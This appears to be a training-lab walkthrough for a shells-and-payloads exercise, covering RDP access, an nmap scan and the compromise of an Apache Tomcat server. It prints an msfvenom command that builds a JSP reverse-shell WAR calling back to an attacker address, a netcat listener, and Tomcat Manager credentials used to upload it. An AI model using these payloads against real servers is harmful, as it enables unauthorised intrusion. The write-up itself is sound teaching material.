# Shell-Payload

Host 1: 

## Host Information and Enumeration

### Connecting via RDP
To access Host-01, we can use the xfreerdp tool:
```bash
xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.34.161
```

### Enumerating Host-01 with Nmap
Initiate an Nmap scan to gather information about the target:
```bash
sudo nmap -sCV 172.16.1.11 -oA nmapH1
```
The Nmap scan reveals various open ports and services on the host.

## Identifying the Hostname

The hostname of Host-01 is identified as 'shells-winsvr' from the Nmap scan results.

## Exploiting the Target and Gaining Shell Access

### Exploitation Approach
The target is running an Apache Tomcat server. We plan to exploit a vulnerability related to Tomcat using the following scenarios:
- Tomcat Manager Authenticated Upload Code Execution
- Generating a .war Format Backdoor
- Using the Tomcat War Deployer Script
- Generating a JSP Webshell

### Metasploit Exploits
We use Metasploit to search for relevant exploits related to Apache Tomcat:
```bash
msfconsole
search tomcat
```
Among the available exploits, we are interested in 'exploit/multi/http/tomcat_mgr_upload'.

### Manual Exploitation: Generating a .war Backdoor
We use msfvenom to generate a Java JSP shell payload:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.108 LPORT=1234 -f war > shell.war
```
Then, we create a listener to receive the shell connection:
```bash
nc -lvp 1234
```
We can  set up the handler and payload to receive the connection In Metasploit.

### Uploading and Executing the Shell
Using the credentials 'tomcat' and 'Tomcatadm', we log in to the Tomcat Manager.
Upload the generated shell ('shell.war') through the Manager interface.
Execute the uploaded shell and wait for the connection.
Once a connection is established, navigate to C:\Shares\ to access the desired folder.

